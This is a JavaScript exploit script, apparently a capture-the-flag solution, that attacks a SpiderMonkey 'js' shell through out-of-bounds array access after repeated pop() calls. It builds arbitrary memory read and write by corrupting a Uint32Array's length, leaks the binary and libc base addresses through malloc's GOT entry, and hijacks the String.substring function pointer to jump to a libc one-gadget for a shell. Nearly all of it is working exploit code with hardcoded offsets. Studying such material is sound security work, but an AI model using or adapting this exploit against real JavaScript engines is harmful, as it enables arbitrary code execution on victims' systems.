function Int2Array(val) {
    var res = [];
    var hexed = ('0000000000000000' + val.toString(16)).substr(-16);
    for (var i = 0; i < 16; i+=2)
        res.push(parseInt(hexed.substring(i,i+2), 16));
    return res;
}

function toDouble(val) {
    var buffer = new ArrayBuffer(8);
    var byteView = new Uint8Array(buffer);
    var view = new Float64Array(buffer);

    byteView.set(Int2Array(val).reverse());
    return view[0];
};

function fromDouble(val) {
    var buffer = new ArrayBuffer(8);
    var view = new Float64Array(buffer);
    view[0] = val;
    return new Uint8Array(buffer, 0, view.BYTES_PER_ELEMENT);
};

function readmem(arg){
    res = "";
    bytes = fromDouble(arg);
    for (var i = 0; i < bytes.length; i++){
        res += ('0' + bytes[bytes.length - 1 - i].toString(16)).substr(-2);
    }
    return parseInt(res, 16);
}

a1=[1,2];
a2=new String("abcd"); // for rip control (vftable overwrite)
a3=new Uint32Array(0x1337);
a3[0]=0x45464143; // "CAFE"
a1.pop();
a1.pop();
a1.pop();
js_pie_leak = readmem(a1[7]); // <js_String(JSContext*, unsigned int, JS::Value*)>: push   r15

is_remote = 1 // change it
if (is_remote) {
    js_pie_base = js_pie_leak - 0x253320;
    substring_addr = js_pie_base + 0x254480;
    malloc_plt = 0x78be48; // objdump -R ./js | grep malloc
} else {
    js_pie_base = js_pie_leak - 0x1e95f0; 
    substring_addr = js_pie_base + 0x1ea750;
    malloc_plt = 0x7222b0; // objdump -R ./js | grep malloc
}

a3_len_idx = a1.indexOf(0x1337); // find a3.length saved index
a1[a3_len_idx] = 0xffffffff; // length to 0xffffffff
a3_buffer_idx = a3_len_idx+2;
a3_buffer_addr = readmem(a1[a3_buffer_idx]);

// idx < 0x100000000 (due to Uint32Array)
oob_read = function(base, idx){
    a1[a3_buffer_idx] = toDouble(base);
    return 0x100000000*a3[idx/4+1] + a3[idx/4];
};
oob_write = function(base, idx, val){
    a1[a3_buffer_idx] = toDouble(base);
    a3[idx/4] = val%0x100000000; 
    a3[idx/4+1] = val/0x100000000;
};

libc_malloc = oob_read(js_pie_base, malloc_plt);
is_oldlibc = 0; // change it
if (is_oldlibc) {  // md5(libc-2.23.so)=="d443f227870b9c29182cc7a7a007d881"
    libc_base = libc_malloc - 0x83550;
    libc_oneshot = libc_base + 0xF0897; 
} else {           // md5(libc-2.23.so)=="a3e78b9d154d9d0936d3a1fda1743479"
    libc_base = libc_malloc - 0x83580; 
    libc_oneshot = libc_base + 0xF0567; 
}

vftable_idx = a1.indexOf(toDouble(substring_addr)); // offset of <str_substring(JSContext*, unsigned int, JS::Value*)>
a1[vftable_idx] = toDouble(libc_oneshot); // String.substring vftable overwrite

a2.substring(); // pwn!